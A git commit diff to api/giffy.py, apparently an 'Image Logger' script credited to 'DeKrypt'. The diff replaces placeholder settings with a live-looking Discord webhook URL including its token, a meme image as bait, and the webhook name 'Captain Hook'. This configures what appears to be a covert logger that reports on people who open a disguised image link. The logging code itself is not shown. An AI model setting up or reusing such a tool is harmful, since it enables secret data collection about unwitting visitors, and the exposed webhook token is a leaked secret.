ceb9d6cba319253d5f057324061df71f0debedeb
Whisker-dev <ibrahimzayd.007@gmail.com>
2025-02-02 19:50:27 +0500

    Update and rename main.py to api/giffy.py

--- api/giffy.py
+++ api/giffy.py
@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335622573358059592/GIVuM4aQ53Vums5oiJkvogRDwnLB-7KxRR3OtlY-K_sLaDoP55xsANlnW6xLuVyFHb05",
+    "image": "https://i.chzbgr.com/thumb800/36988421/h3F7D49F4/28-relatable-memes-to-enjoy-with-your-morning-coffee-and-kickstart-your-workday", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Captain Hook", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
